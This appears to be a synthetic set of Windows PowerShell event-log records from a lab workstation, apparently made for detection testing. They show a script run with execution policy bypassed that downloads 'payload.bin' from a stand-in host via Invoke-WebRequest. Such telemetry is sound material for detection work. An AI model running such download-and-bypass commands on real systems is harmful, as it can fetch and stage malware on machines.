{"timestamp":"2026-01-15T10:06:04Z","record_id":3001,"provider":"Microsoft-Windows-PowerShell","provider_guid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","channel":"Windows PowerShell","computer":"LAB-WKS-002","event_id":400,"level":4,"task":0,"opcode":0,"keywords":"0x8000000000000000","process_id":5104,"thread_id":4808,"event_data":{"EngineVersion":"5.1.26000.1","HostName":"ConsoleHost","HostVersion":"5.1.26000.1","HostApplication":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\Example\\collect.ps1","RunspaceId":"11111111-2222-3333-4444-555555555555","PipelineId":"1"}}
{"timestamp":"2026-01-15T10:06:04Z","record_id":3002,"provider":"Microsoft-Windows-PowerShell","provider_guid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","channel":"Microsoft-Windows-PowerShell/Operational","computer":"LAB-WKS-002","event_id":4103,"level":4,"task":106,"opcode":20,"keywords":"0x0","process_id":5104,"thread_id":4812,"event_data":{"CommandInvocation":"Invoke-WebRequest","ParameterBinding":"Uri=http://example.invalid/collect; OutFile=C:\\ProgramData\\Example\\payload.bin","ContextInfo":"User=EXAMPLE\\operator; Host Application=powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\Example\\collect.ps1"}}
{"timestamp":"2026-01-15T10:06:05Z","record_id":3003,"provider":"Microsoft-Windows-PowerShell","provider_guid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","channel":"Microsoft-Windows-PowerShell/Operational","computer":"LAB-WKS-002","event_id":4104,"level":3,"task":2,"opcode":15,"keywords":"0x0","process_id":5104,"thread_id":4816,"event_data":{"MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"$target = 'http://example.invalid/collect'; Invoke-WebRequest -Uri $target -OutFile 'C:\\ProgramData\\Example\\payload.bin'","ScriptBlockId":"66666666-7777-8888-9999-AAAAAAAAAAAA","Path":"C:\\ProgramData\\Example\\collect.ps1"}}
{"timestamp":"2026-01-15T10:06:07Z","record_id":3004,"provider":"Microsoft-Windows-PowerShell","provider_guid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","channel":"Windows PowerShell","computer":"LAB-WKS-002","event_id":403,"level":4,"task":0,"opcode":0,"keywords":"0x8000000000000000","process_id":5104,"thread_id":4820,"event_data":{"EngineVersion":"5.1.26000.1","HostName":"ConsoleHost","HostApplication":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\Example\\collect.ps1","RunspaceId":"11111111-2222-3333-4444-555555555555","PipelineId":"1"}}
